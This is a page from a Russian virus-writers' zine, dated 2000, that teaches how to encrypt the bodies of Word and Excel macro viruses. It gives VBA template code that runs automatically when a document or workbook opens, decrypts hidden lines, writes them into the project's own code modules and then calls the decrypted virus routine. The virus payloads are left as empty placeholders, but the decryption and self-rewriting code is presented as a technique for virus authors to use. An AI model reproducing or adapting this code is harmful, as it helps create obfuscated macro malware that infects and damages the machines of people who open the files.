- [Duke's Virus Labs #10] - [Page 26] -

Шифровка для W0rd & Excel
(c) by ULTRAS/MATRiX


 				2 способа шифровки:
			       ───────────────────── 

 1. Этот метод создает переменную в которой храниться зашифрованное тело вируса,
    метод очень широко использовался в макро вирусах Word 6-7. Автором этой 
    шифровки был Nightmare Joker. Ниже пример вируса защифроавнного таким 
    способом.

───┤ Пример для W0rd ├─────────────────────────────────────────────────────────

Sub AutoOpen()

Dim x(6) As String

Зашифровонное тело макроса Autoclose

x(1) = ""
x(2) = ""
x(3) = "" < вирусное зашифрованное тело 
x(4) = ""
x(5) = ""
x(6) = ""

For i = 1 To 6 'сколько расшифровать строк

bz = bz & decrypt(x(i))

Next i

 Расшифроваем тело вируса

If ThisDocument.VBProject.VBComponents("ZSZ").CodeModule.Lines(31, 1) = "" Then ThisDocument.VBProject.VBComponents("ZSZ").CodeModule.InsertLines 31, bz

 Код уже расшифрованн?

End Sub



Function decrypt(c As String)

Расшифровщик вирус

For o = 1 To Len(c)

z = Mid(c, o, 1)

If Asc(z) > 177 Then z = ""

x = x & z

Next o

decrypt = x & vbCr

End Function



 2. Этот метод xранит зашифрованное тело вируса прямо в исходном коде, мне очень 
    нравиться этот метод и он более удобен чем первый.

───┤ Пример для Excel ├───────────────────────────────────────────────────────-


Private Sub Workbook_Open()

If Workbooks.Count > 1 Then

For d = 18 to ?? 'сколько расшифровать строк

C$ = ""

I = (ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))

f = (Mid(I, 2, 1))

For X = 3 To Len(I)

B$ = Asc(Mid(I, X, 1)) - f

C$ = C$ & Chr(B$)

Next X

 'Расшифроваем тело вируса

A = C$

ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A

Next d

' Записываем его в место зашифрованного тела

Call virus ' запускаем расшифрованный вирус

End If

End Sub

Private Sub virus()

'
'
' < вирусное зашифрованное тело
'
'
End Sub

  							      -=U=- (c) 2000
							    What`s my age again
